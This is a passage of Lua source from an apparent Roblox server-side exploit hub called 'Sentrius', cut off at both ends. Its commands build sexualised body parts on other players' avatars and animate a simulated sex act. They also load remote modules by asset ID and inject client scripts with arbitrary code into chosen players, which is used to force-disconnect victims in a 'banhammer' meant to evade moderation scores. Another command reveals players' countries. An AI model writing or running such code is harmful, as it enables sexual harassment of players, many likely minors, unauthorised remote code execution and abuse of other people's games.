                    funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
                end
                return funcw
            end
            
            local WE = nil
            
            V1.Parent:FindFirstChild("Humanoid").PlatformStand = true
            P1['Left Shoulder']:Destroy()
            local LA1 = Instance.new('Weld', P1)
            LA1.Part0 = P1
            LA1.Part1 = P1.Parent['Left Arm']
            LA1.C0 = CFrame.new(-1.5, 0, 0)
            LA1.Name = 'Left Shoulder'
            
            P1['Right Shoulder']:Destroy()
            local RS1 = Instance.new('Weld', P1)
            RS1.Part0 = P1
            RS1.Part1 = P1.Parent['Right Arm']
            RS1.C0 = CFrame.new(1.5, 0, 0)
            RS1.Name = 'Right Shoulder'
            
            V1['Left Shoulder']:Destroy()
            local LS2 = Instance.new('Weld', V1)
            LS2.Part0 = V1
            LS2.Part1 = V1.Parent['Left Arm']
            LS2.C0 = CFrame.new(-1.5, 0, 0)
            LS2.Name = 'Left Shoulder'
            
            V1['Right Shoulder']:Destroy()
            local RS2 = Instance.new('Weld', V1)
            RS2.Part0 = V1
            RS2.Part1 = V1.Parent['Right Arm']
            RS2.C0 = CFrame.new(1.5, 0, 0)
            RS2.Name = 'Right Shoulder'
            
            V1['Left Hip']:Destroy()
            local LH2 = Instance.new('Weld', V1)
            LH2.Part0 = V1
            LH2.Part1 = V1.Parent['Left Leg']
            LH2.C0 = CFrame.new(-0.5, -2, 0)
            LH2.Name = 'Left Hip'
            
            V1['Right Hip']:Destroy()
            local RH2 = Instance.new('Weld', V1)
            RH2.Part0 = V1
            RH2.Part1 = V1.Parent['Right Leg']
            RH2.C0 = CFrame.new(0.5, -2, 0)
            RH2.Name = 'Right Hip'
            
            local BL = Instance.new('Part', V1)
            BL.TopSurface = 0
            BL.BottomSurface = 0
            BL.CanCollide = false
            BL.Color = V1.Color
            BL.Shape = 'Ball'
            BL.Size = Vector3.new(1, 1, 1)
            local DM2 = Instance.new('SpecialMesh', BL)
            DM2.MeshType = 'Sphere'
            DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
            fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
            
            local BR = Instance.new('Part', V1)
            BR.TopSurface = 0
            BR.BottomSurface = 0
            BR.CanCollide = false
            BR.Color = V1.Color
            BR.Shape = 'Ball'
            BR.Size = Vector3.new(1, 1, 1)
            local DM3 = Instance.new('SpecialMesh', BR)
            DM3.MeshType = 'Sphere'
            DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
            fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
            
            local BLN = Instance.new('Part', V1)
            BLN.TopSurface = 0
            BLN.BottomSurface = 0
            BLN.CanCollide = false
            BLN.BrickColor = BrickColor.new('Pink')
            BLN.Shape = 'Ball'
            BLN.Size = Vector3.new(1, 1, 1)
            local DM4 = Instance.new('SpecialMesh', BLN)
            DM4.MeshType = 'Sphere'
            DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
            fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
            
            local BRN = Instance.new('Part', V1)
            BRN.TopSurface = 0
            BRN.BottomSurface = 0
            BRN.CanCollide = false
            BRN.BrickColor = BrickColor.new('Pink')
            BRN.Shape = 'Ball'
            BRN.Size = Vector3.new(1, 1, 1)
            local DM5 = Instance.new('SpecialMesh', BRN)
            DM5.MeshType = 'Sphere'
            DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
            fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
            
            local B = Instance.new('Part', V1)
            B.TopSurface = 0
            B.BottomSurface = 0
            B.CanCollide = false
            B.Color = V1.Color
            B.Shape = 'Ball'
            B.Size = Vector3.new(1.3, 1.3, 1.3)
            local BM = Instance.new('SpecialMesh', B)
            BM.MeshType = 'Sphere'
            BM.Scale = Vector3.new(1.25, 1.25, 1.25)
            fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
            
            local B2 = Instance.new('Part', V1)
            B2.TopSurface = 0
            B2.BottomSurface = 0
            B2.CanCollide = false
            B2.Color = V1.Color
            B2.Shape = 'Ball'
            B2.Size = Vector3.new(1.3, 1.3, 1.3)
            local BM2 = Instance.new('SpecialMesh', B2)
            BM2.MeshType = 'Sphere'
            BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
            fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)
            
            local tip = Instance.new("Part", argt[1].Character)
            local peep = Instance.new("Part", argt[1].Character)
            local ball1 = Instance.new("Part", argt[1].Character)
            local ball2 = Instance.new("Part", argt[1].Character)
            
            local tipmesh = Instance.new("SpecialMesh", tip)
            local peepmesh = Instance.new("CylinderMesh", peep)
            local ball1mesh = Instance.new("SpecialMesh", ball1)
            local ball2mesh = Instance.new("SpecialMesh", ball2)
            
            local tipweld = Instance.new("WeldConstraint", argt[1].Character)
            local peepweld = Instance.new("WeldConstraint", argt[1].Character)
            local peepweld2 = Instance.new("WeldConstraint", peep)
            local ball1weld = Instance.new("WeldConstraint", argt[1].Character)
            local ball2weld = Instance.new("WeldConstraint", argt[1].Character)
            
            tip.BrickColor = BrickColor.new("Pink")
            tip.Size = Vector3.new(1, 1, 1)
            tip.BottomSurface = "Smooth"
            tip.TopSurface = "Smooth"
            tip.CanCollide = false
            tip.Locked = true
            
            peep.Color = argt[1].Character.Torso.Color
            peep.Size = Vector3.new(0.4, 1.3, 0.4)
            peep.BottomSurface = "Smooth"
            peep.TopSurface = "Smooth"
            peep.CanCollide = false
            peep.Locked = true
            
            ball1.Color = argt[1].Character.Torso.Color
            ball1.Size = Vector3.new(1, 1, 1)
            ball1.BottomSurface = "Smooth"
            ball1.TopSurface = "Smooth"
            ball1.CanCollide = false
            ball1.Locked = true
            
            ball2.Color = argt[1].Character.Torso.Color
            ball2.Size = Vector3.new(1, 1, 1)
            ball2.BottomSurface = "Smooth"
            ball2.TopSurface = "Smooth"
            ball2.CanCollide = false
            ball2.Locked = true
            
            tipmesh.MeshType = "Sphere"
            tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)
            
            ball1mesh.MeshType = "Sphere"
            ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
            
            ball2mesh.MeshType = "Sphere"
            ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
            
            peep.CFrame = argt[1].Character.Torso.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(math.rad(90), 0, 0)
            tip.CFrame = peep.CFrame * CFrame.new(0, -0.7, 0)
            ball1.CFrame = peep.CFrame * CFrame.new(0.3, 0.4, 0.25)
            ball2.CFrame = peep.CFrame * CFrame.new(-0.3, 0.4, 0.25)
            
            tipweld.Part0 = argt[1].Character.Torso
            tipweld.Part1 = tip
            
            peepweld.Part0 = argt[1].Character.Torso
            peepweld.Part1 = peep
            
            peepweld2.Part0 = peep
            peepweld2.Part1 = tip
            
            ball1weld.Part0 = argt[1].Character.Torso
            ball1weld.Part1 = ball1
            
            ball2weld.Part0 = argt[1].Character.Torso
            ball2weld.Part1 = ball2
            
            LH2.C1 = CFrame.new(0.2, 1.6, 0.4) * CFrame.Angles(3.9, -0.4, 0)
            RH2.C1 = CFrame.new(-0.2, 1.6, 0.4) * CFrame.Angles(3.9, 0.4, 0)
            LS2.C1 = CFrame.new(-0.2, 0.9, 0.6) * CFrame.Angles(3.9, -0.2, 0)
            RS2.C1 = CFrame.new(0.2, 0.9, 0.6) * CFrame.Angles(3.9, 0.2, 0)
            LA1.C1 = CFrame.new(-0.5, 0.7, 0) * CFrame.Angles(-0.9, -0.4, 0)
            RS1.C1 = CFrame.new(0.5, 0.7, 0) * CFrame.Angles(-0.9, 0.4, 0)
            
            WE = fWeld('weldx', P1, P1, V1, true, 0, -1, -2, math.rad(-90), 0, 0)
            local N = V1.Neck
            N.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)
            
            task.spawn(function()
                while task.wait() do
                    for i = 1, 6 do
                        WE.C0 = WE.C0 * CFrame.new(0, 0.1, 0)
                        task.wait(0.030)
                    end
                    
                    for i = 1, 6 do
                        WE.C0 = WE.C0 * CFrame.new(0, -0.1, 0)
                        task.wait(0.030)
                    end
                    task.wait()
                end
            end)
        else
            notify(plr, "Sentrius", "Target doesn't have required body parts!", 3)
        end
    end
}) --vecxo light

addCommand({
    name = "dex",
    aliases = {"ssdex"},
    desc = "self explanatory (owna only)",
    usage = prefix .. "dex [player]",
    callback = function(plr, args)
        if not owna(plr) then
            return
        end
        
        if not args or #args == 0 then
            args = {plr.Name}
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "No player found!", 3)
            return
        end
        
        for _, target in ipairs(targets) do
            task.spawn(function()
                local success, fail = pcall(function()
                    require(12146718110):Fire(target.Name)
                end)
                
                if not success then
                    notify(plr, "Sentrius", "Dex failed to load: " .. tostring(fail), 3)
                    return
                end
                
                if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
                    local ticking = tick()
                    require(112691275102014).load()
                    repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
                end
                
                task.wait(7.5)
                
                local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
                
                if not goog then
                    warn("goog failed to be added, command can not continue")
                    notify(plr, "Sentrius", "goog failed to load for cleanup", 3)
                    return
                end
                
                local scr = goog:FindFirstChild("Utilities").Client:Clone()
                local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
                
                loa.Parent = scr
                scr:WaitForChild("Exec").Value = [[
                    workspace.Camera:ClearAllChildren()
                    repeat task.wait() until not workspace.Camera:FindFirstChild("Part")
                    script:Destroy()
                ]]
                
                if target:FindFirstChild("PlayerGui") then
                    scr.Parent = target.PlayerGui
                else
                    scr.Parent = target.Character
                end
                
                scr.Enabled = true
                
                notify(plr, "Sentrius", "Gave Dex to " .. target.DisplayName, 3)
            end)
        end
    end
})

addCommand({
    name = "locate",
    aliases = {},
    desc = "locate..",
    usage = prefix .. "locate [player]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "locate [player]", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "No player found!", 3)
            return
        end
        
        local LocalizationService = game:GetService("LocalizationService")

        --Country Flags v3
        local countryFlags = {
            US = "🇺🇸", CA = "🇨🇦", MX = "🇲🇽", BR = "🇧🇷", AR = "🇦🇷", CL = "🇨🇱", CO = "🇨🇴", PE = "🇵🇪", VE = "🇻🇪",
            EC = "🇪🇨", BO = "🇧🇴", PY = "🇵🇾", UY = "🇺🇾", GY = "🇬🇾", SR = "🇸🇷", CR = "🇨🇷", PA = "🇵🇦", GT = "🇬🇹",
            HN = "🇭🇳", SV = "🇸🇻", NI = "🇳🇮", CU = "🇨🇺", DO = "🇩🇴", HT = "🇭🇹", JM = "🇯🇲", TT = "🇹🇹", BS = "🇧🇸",
            BB = "🇧🇧", BZ = "🇧🇿", GD = "🇬🇩", LC = "🇱🇨", VC = "🇻🇨", AG = "🇦🇬", DM = "🇩🇲", KN = "🇰🇳",
            GB = "🇬🇧", DE = "🇩🇪", FR = "🇫🇷", ES = "🇪🇸", IT = "🇮🇹", NL = "🇳🇱", BE = "🇧🇪", CH = "🇨🇭", AT = "🇦🇹",
            PT = "🇵🇹", GR = "🇬🇷", SE = "🇸🇪", NO = "🇳🇴", DK = "🇩🇰", FI = "🇫🇮", PL = "🇵🇱", CZ = "🇨🇿", RO = "🇷🇴",
            HU = "🇭🇺", BG = "🇧🇬", SK = "🇸🇰", HR = "🇭🇷", SI = "🇸🇮", LT = "🇱🇹", LV = "🇱🇻", EE = "🇪🇪", IE = "🇮🇪",
            IS = "🇮🇸", LU = "🇱🇺", MT = "🇲🇹", CY = "🇨🇾", RS = "🇷🇸", BA = "🇧🇦", ME = "🇲🇪", MK = "🇲🇰", AL = "🇦🇱",
            MD = "🇲🇩", BY = "🇧🇾", UA = "🇺🇦", RU = "🇷🇺", CN = "🇨🇳", JP = "🇯🇵", KR = "🇰🇷", IN = "🇮🇳", PK = "🇵🇰",
            BD = "🇧🇩", VN = "🇻🇳", TH = "🇹🇭", PH = "🇵🇭", ID = "🇮🇩", MY = "🇲🇾", SG = "🇸🇬", MM = "🇲🇲", KH = "🇰🇭",
            LA = "🇱🇦", NP = "🇳🇵", LK = "🇱🇰", AF = "🇦🇫", IQ = "🇮🇶", IR = "🇮🇷", TR = "🇹🇷", SA = "🇸🇦", AE = "🇦🇪",
            IL = "🇮🇱", JO = "🇯🇴", LB = "🇱🇧", SY = "🇸🇾", YE = "🇾🇪", OM = "🇴🇲", KW = "🇰🇼", BH = "🇧🇭", QA = "🇶🇦",
            MN = "🇲🇳", KZ = "🇰🇿", UZ = "🇺🇿", TM = "🇹🇲", KG = "🇰🇬", TJ = "🇹🇯", GE = "🇬🇪", AM = "🇦🇲", AZ = "🇦🇿",
            BT = "🇧🇹", MV = "🇲🇻", BN = "🇧🇳", TL = "🇹🇱", EG = "🇪🇬", ZA = "🇿🇦", NG = "🇳🇬", KE = "🇰🇪", ET = "🇪🇹",
            GH = "🇬🇭", TZ = "🇹🇿", UG = "🇺🇬", DZ = "🇩🇿", MA = "🇲🇦", TN = "🇹🇳", LY = "🇱🇾", SD = "🇸🇩", SS = "🇸🇸",
            SO = "🇸🇴", AO = "🇦🇴", MZ = "🇲🇿", ZW = "🇿🇼", ZM = "🇿🇲", MW = "🇲🇼", BW = "🇧🇼", NA = "🇳🇦", SZ = "🇸🇿",
            LS = "🇱🇸", CM = "🇨🇲", CI = "🇨🇮", SN = "🇸🇳", ML = "🇲🇱", NE = "🇳🇪", BF = "🇧🇫", TD = "🇹🇩", CF = "🇨🇫",
            CG = "🇨🇬", CD = "🇨🇩", GA = "🇬🇦", GQ = "🇬🇶", BJ = "🇧🇯", TG = "🇹🇬", LR = "🇱🇷", SL = "🇸🇱", GN = "🇬🇳",
            GW = "🇬🇼", GM = "🇬🇲", MR = "🇲🇷", ER = "🇪🇷", DJ = "🇩🇯", RW = "🇷🇼", BI = "🇧🇮", SC = "🇸🇨", MU = "🇲🇺",
            KM = "🇰🇲", MG = "🇲🇬", CV = "🇨🇻", ST = "🇸🇹", AU = "🇦🇺", NZ = "🇳🇿", FJ = "🇫🇯", PG = "🇵🇬", WS = "🇼🇸",
            SB = "🇸🇧", VU = "🇻🇺", TO = "🇹🇴", KI = "🇰🇮", FM = "🇫🇲", MH = "🇲🇭", PW = "🇵🇼", NR = "🇳🇷", TV = "🇹🇻"
        }

        --County Names v3
        local countryNames = {
            US = "United States", CA = "Canada", MX = "Mexico", BR = "Brazil", AR = "Argentina", CL = "Chile",
            CO = "Colombia", PE = "Peru", VE = "Venezuela", EC = "Ecuador", BO = "Bolivia", PY = "Paraguay",
            UY = "Uruguay", GY = "Guyana", SR = "Suriname", CR = "Costa Rica", PA = "Panama", GT = "Guatemala",
            HN = "Honduras", SV = "El Salvador", NI = "Nicaragua", CU = "Cuba", DO = "Dominican Republic",
            HT = "Haiti", JM = "Jamaica", TT = "Trinidad and Tobago", BS = "Bahamas", BB = "Barbados",
            BZ = "Belize", GD = "Grenada", LC = "Saint Lucia", VC = "Saint Vincent", AG = "Antigua and Barbuda",
            DM = "Dominica", KN = "Saint Kitts and Nevis", GB = "United Kingdom", DE = "Germany", FR = "France",
            ES = "Spain", IT = "Italy", NL = "Netherlands", BE = "Belgium", CH = "Switzerland", AT = "Austria",
            PT = "Portugal", GR = "Greece", SE = "Sweden", NO = "Norway", DK = "Denmark", FI = "Finland",
            PL = "Poland", CZ = "Czech Republic", RO = "Romania", HU = "Hungary", BG = "Bulgaria", SK = "Slovakia",
            HR = "Croatia", SI = "Slovenia", LT = "Lithuania", LV = "Latvia", EE = "Estonia", IE = "Ireland",
            IS = "Iceland", LU = "Luxembourg", MT = "Malta", CY = "Cyprus", RS = "Serbia", BA = "Bosnia and Herzegovina",
            ME = "Montenegro", MK = "North Macedonia", AL = "Albania", MD = "Moldova", BY = "Belarus", UA = "Ukraine",
            RU = "Russia", CN = "China", JP = "Japan", KR = "South Korea", IN = "India", PK = "Pakistan",
            BD = "Bangladesh", VN = "Vietnam", TH = "Thailand", PH = "Philippines", ID = "Indonesia", MY = "Malaysia",
            SG = "Singapore", MM = "Myanmar", KH = "Cambodia", LA = "Laos", NP = "Nepal", LK = "Sri Lanka",
            AF = "Afghanistan", IQ = "Iraq", IR = "Iran", TR = "Turkey", SA = "Saudi Arabia", AE = "United Arab Emirates",
            IL = "Israel", JO = "Jordan", LB = "Lebanon", SY = "Syria", YE = "Yemen", OM = "Oman", KW = "Kuwait",
            BH = "Bahrain", QA = "Qatar", MN = "Mongolia", KZ = "Kazakhstan", UZ = "Uzbekistan", TM = "Turkmenistan",
            KG = "Kyrgyzstan", TJ = "Tajikistan", GE = "Georgia", AM = "Armenia", AZ = "Azerbaijan", BT = "Bhutan",
            MV = "Maldives", BN = "Brunei", TL = "Timor-Leste", EG = "Egypt", ZA = "South Africa", NG = "Nigeria",
            KE = "Kenya", ET = "Ethiopia", GH = "Ghana", TZ = "Tanzania", UG = "Uganda", DZ = "Algeria", MA = "Morocco",
            TN = "Tunisia", LY = "Libya", SD = "Sudan", SS = "South Sudan", SO = "Somalia", AO = "Angola",
            MZ = "Mozambique", ZW = "Zimbabwe", ZM = "Zambia", MW = "Malawi", BW = "Botswana", NA = "Namibia",
            SZ = "Eswatini", LS = "Lesotho", CM = "Cameroon", CI = "Ivory Coast", SN = "Senegal", ML = "Mali",
            NE = "Niger", BF = "Burkina Faso", TD = "Chad", CF = "Central African Republic", CG = "Republic of the Congo",
            CD = "Democratic Republic of the Congo", GA = "Gabon", GQ = "Equatorial Guinea", BJ = "Benin", TG = "Togo",
            LR = "Liberia", SL = "Sierra Leone", GN = "Guinea", GW = "Guinea-Bissau", GM = "Gambia", MR = "Mauritania",
            ER = "Eritrea", DJ = "Djibouti", RW = "Rwanda", BI = "Burundi", SC = "Seychelles", MU = "Mauritius",
            KM = "Comoros", MG = "Madagascar", CV = "Cape Verde", ST = "Sao Tome and Principe", AU = "Australia",
            NZ = "New Zealand", FJ = "Fiji", PG = "Papua New Guinea", WS = "Samoa", SB = "Solomon Islands",
            VU = "Vanuatu", TO = "Tonga", KI = "Kiribati", FM = "Micronesia", MH = "Marshall Islands", PW = "Palau",
            NR = "Nauru", TV = "Tuvalu"
        }
        
        for _, target in ipairs(targets) do
            task.spawn(function()
                local countryCode = "??"
                local success = pcall(function()
                    countryCode = LocalizationService:GetCountryRegionForPlayerAsync(target)
                end)
                
                if success and countryCode ~= "??" then
                    local flag = countryFlags[countryCode] or "🌍"
                    local country = countryNames[countryCode] or "Unknown"
                    
                    notify(plr, "Sentrius", target.DisplayName .. " is from " .. country .. " " .. flag .. "!!!!!!", 5)
                else
                    notify(plr, "Sentrius", "Failed to get location for " .. target.DisplayName, 3)
                end
            end)
        end
    end
})

addCommand({
    name = "fov",
    aliases = {"fieldofview"},
    desc = "self explanatory",
    usage = prefix .. "fov [player (optional)] [fov]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        local target = plr
        local fovValue
        
        if args and #args >= 2 then
            local targets = GetPlayer(args[1], plr)
            if targets and #targets > 0 then
                target = targets[1]
                fovValue = tonumber(args[2])
            else
                notify(plr, "Sentrius", "No player found!", 3)
                return
            end
        elseif args and #args == 1 then
            fovValue = tonumber(args[1])
        else
            notify(plr, "Sentrius", "Usage: " .. prefix .. "fov [player (optional)] [fov]", 3)
            return
        end
        
        if not fovValue then
            notify(plr, "Sentrius", "Invalid FOV value!", 3)
            return
        end
        
        if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
            local ticking = tick()
            require(112691275102014).load()
            repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
        end
        
        local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
        
        if not goog then
            warn("goog failed to load for fov")
            notify(plr, "Sentrius", "Failed to load goog!", 3)
            return
        end
        
        local scr = goog:FindFirstChild("Utilities").Client:Clone()
        local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
        
        loa.Parent = scr
        scr:WaitForChild("Exec").Value = string.format([[
            local fov=%d;
            local cam=workspace.CurrentCamera;
            cam.FieldOfView=fov;
            game:GetService("RunService").RenderStepped:Connect(function()
                if cam.FieldOfView~=fov then
                    cam.FieldOfView=fov
                end
            end)
            script:Destroy()
        ]], fovValue)
        
        if target:FindFirstChild("PlayerGui") then
            scr.Parent = target.PlayerGui
        else
            scr.Parent = target.Character
        end
        
        scr.Enabled = true
        
        if target == plr then
            notify(plr, "Sentrius", "Set your FOV to " .. fovValue, 3)
        else
            notify(plr, "Sentrius", "Set " .. target.DisplayName .. "'s FOV to " .. fovValue, 3)
        end
    end
})

addCommand({
    name = "banhammer",
    aliases = {},
    desc = "a banhammer that wont affect ur score..",
    usage = prefix .. "banhammer [player (optional)]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        local target = plr
        
        if args and #args > 0 then
            local targets = GetPlayer(args[1], plr)
            if targets and #targets > 0 then
                target = targets[1]
            else
                return
            end
        end
        
        if not target.Character or not target:FindFirstChild("Backpack") then
            notify(plr, "Sentrius", target.DisplayName .. " doesn't have a character or their backpack is disabled.", 3)
            return
        end
        
        local InsertService = game:GetService("InsertService")
        
        local success, hammer = pcall(function()
            return InsertService:LoadAsset(10468797)
        end)
        
        if not success or not hammer then
            notify(plr, "Sentrius", "faihled to ghet ban hamma", 3)
            return
        end
        
        local tool = hammer:FindFirstChildOfClass("Tool")
        if not tool then
            hammer:Destroy()
            notify(plr, "Sentrius", "lel banhammer is brocken", 3)
            return
        end
        
        if not _G.TempBans then
            _G.TempBans = {}
        end
        
        local handle = tool:FindFirstChild("Handle")
        if handle then
           local mesh = handle:FindFirstChildOfClass("SpecialMesh")
           if mesh then
          mesh.Scale = mesh.Scale * 2
        end
            handle.Massless = true
            local connection
            connection = handle.Touched:Connect(function(hit)
                if not running then 
                    connection:Disconnect()
                    return 
                end
                
                local victim = Players:GetPlayerFromCharacter(hit.Parent)
                
                if victim and victim ~= target then
                    if owna(victim) and not owna(target) then
                        return
                    end
                    
                    if whitelist[victim.UserId] and not owna(target) then
                        return
                    end
                    
                    if _G.TempBans[victim.UserId] then
                        return
                    end
                    
                    local banSound = Instance.new("Sound")
                    banSound.SoundId = "rbxassetid://5696182212"
                    banSound.Volume = 1
                    banSound.Parent = workspace
                    banSound:Play()
                    game:GetService("Debris"):AddItem(banSound, 4)
                    
                    _G.TempBans[victim.UserId] = true
                    
                    local hint = Instance.new("Hint")
                    hint.Text = victim.DisplayName .. " has been Server Banned for 5 minutes!"
                    hint.Parent = workspace
                    game:GetService("Debris"):AddItem(hint, 5.5)
                    
                    if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
                        local ticking = tick()
                        require(112691275102014).load()
                        repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
                    end
                    
                    local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
                    
                    if not goog then
                        warn("goog failed to load for banhammer")
                        notify(plr, "Sentrius", "Failed to load goog!", 3)
                        return
                    end
                    
                    local scr = goog:FindFirstChild("Utilities").Client:Clone()
                    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
                    
                    loa.Parent = scr
                    scr:WaitForChild("Exec").Value = [[
                        game.Players.LocalPlayer:Destroy()
                        script:Destroy()
                    ]]
                    
                    if victim:FindFirstChild("PlayerGui") then
                        scr.Parent = victim.PlayerGui
                    elseif victim.Character then
                        scr.Parent = victim.Character
                    end
                    
                    scr.Enabled = true
                    
                    task.delay(300, function()
                        if _G.TempBans[victim.UserId] then
                            _G.TempBans[victim.UserId] = nil
                            notify(plr, "Sentrius", victim.DisplayName .. "'s 5-minute ban has expired.", 3)
                        end
                    end)
                end
            end)
            
            tool.AncestryChanged:Connect(function()
                if not tool.Parent then
                    connection:Disconnect()
                end
            end)
        end
        
        tool.Parent = target.Backpack
        hammer:Destroy()
        
        if target == plr then
            notify(plr, "Sentrius", "ban hammer that wont take away your score..", 3)
        else
            notify(plr, "Sentrius", target.DisplayName .. " has the ban hammer..", 3)
            notify(target, "Sentrius", "With this banhammer, you can ban people for 5 minutes without your score decreasing.", 4)
        end
    end
})

addCommand({
    name = "antimusic",
    aliases = {"nomusic", "mutemusic"},
    desc = "Prevents all music/sounds from playing in the game",
    usage = prefix .. "antimusic",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if _G.AntiMusicEnabled then
            notify(plr, "Sentrius", "Anti-music is already enabled!", 3)
            return
        end
        
        _G.AntiMusicEnabled = true
        

        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("Sound") then
                obj:Stop()
                obj.Volume = 0
            end
        end
        

        if not connections["antimusic"] then
            connections["antimusic"] = workspace.DescendantAdded:Connect(function(descendant)
                if not _G.AntiMusicEnabled then return end
                
                if descendant:IsA("Sound") then
                    descendant:Stop()
                    descendant.Volume = 0
                end
            end)
        end
        

        if not connections["antimusic_monitor"] then
            connections["antimusic_monitor"] = game:GetService("RunService").Heartbeat:Connect(function()
                if not _G.AntiMusicEnabled then return end
                
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("Sound") and obj.Playing then
                        obj:Stop()
                        obj.Volume = 0
                    end
                end
            end)
        end
        
        notify(plr, "Sentrius", "Anti-music enabled! All sounds have been muted.", 3)
    end
})

addCommand({
    name = "unantimusic",
    aliases = {"unnomusic", "allowmusic"},
    desc = "Allows music/sounds to play again",
    usage = prefix .. "unantimusic",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not _G.AntiMusicEnabled then
            notify(plr, "Sentrius", "Anti-music is not enabled!", 3)
            return
        end
        
        _G.AntiMusicEnabled = false
        

        if connections["antimusic"] then
            connections["antimusic"]:Disconnect()
            connections["antimusic"] = nil
        end
        
        if connections["antimusic_monitor"] then
            connections["antimusic_monitor"]:Disconnect()
            connections["antimusic_monitor"] = nil
        end
        

        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("Sound") then
                obj.Volume = 0.5
            end
        end
        
        notify(plr, "Sentrius", "Anti-music disabled! Sounds can now play.", 3)
    end
})

addCommand({
    name = "speed",
    aliases = {"playbackspeed"},
    desc = "self explanatory",
    usage = prefix .. "speed [number]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "speed [number]", 3)
            return
        end
        
        local speedValue = tonumber(args[1])
        if not speedValue then
            notify(plr, "Sentrius", "Invalid speed value!", 3)
            return
        end
        
        local count = 0
        for _, sound in ipairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") and sound.Parent == workspace and sound.IsPlaying then
                sound.PlaybackSpeed = speedValue
                count = count + 1
            end
        end
        
        if count > 0 then
            notify(plr, "Sentrius", "Set sound speed to " .. speedValue, 3)
        else
            notify(plr, "Sentrius", "No music found in workspace!", 3)
        end
    end
})

addCommand({
    name = "pitch",
    aliases = {},
    desc = "self explanatory",
    usage = prefix .. "pitch [number]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "pitch [number]", 3)
            return
        end
        
        local pitchValue = tonumber(args[1])
        if not pitchValue then
            notify(plr, "Sentrius", "Invalid pitch value!", 3)
            return
        end
        
        local count = 0
        for _, sound in ipairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") and sound.Parent == workspace and sound.IsPlaying then
                sound.PlaybackSpeed = pitchValue
                count = count + 1
            end
        end
        
        if count > 0 then
            notify(plr, "Sentrius", "Set sound pitch to " .. pitchValue, 3)
        else
            notify(plr, "Sentrius", "No music found in workspace!", 3)
        end
    end
})

addCommand({
    name = "volume",
    aliases = {"vol"},
    desc = "self explanatory",
    usage = prefix .. "volume [0-10]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "volume [0-10]", 3)
            return
        end
        
        local volValue = tonumber(args[1])
        if not volValue then
            notify(plr, "Sentrius", "Invalid volume value!", 3)
            return
        end
        
        local count = 0
        for _, sound in ipairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") and sound.Parent == workspace and sound.IsPlaying then
                sound.Volume = volValue
                count = count + 1
            end
        end
        
        if count > 0 then
            notify(plr, "Sentrius", "Set sound volume to " .. volValue, 3)
        else
            notify(plr, "Sentrius", "No music found in workspace!", 3)
        end
    end
})

addCommand({
    name = "reverb",
    aliases = {},
    desc = "self explanatory",
    usage = prefix .. "reverb [0-1]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        local reverbValue = 0.5
        if args and #args > 0 then
            reverbValue = tonumber(args[1]) or 0.5
        end
        
        local count = 0
        for _, sound in ipairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") and sound.Parent == workspace and sound.IsPlaying then
                local reverb = sound:FindFirstChildOfClass("ReverbSoundEffect")
                if not reverb then
                    reverb = Instance.new("ReverbSoundEffect")
                    reverb.Parent = sound
                end
                reverb.DecayTime = reverbValue * 10
                reverb.Density = reverbValue
                reverb.Diffusion = reverbValue
                reverb.DryLevel = 0
                reverb.WetLevel = reverbValue * -10
                count = count + 1
            end
        end
        
        if count > 0 then
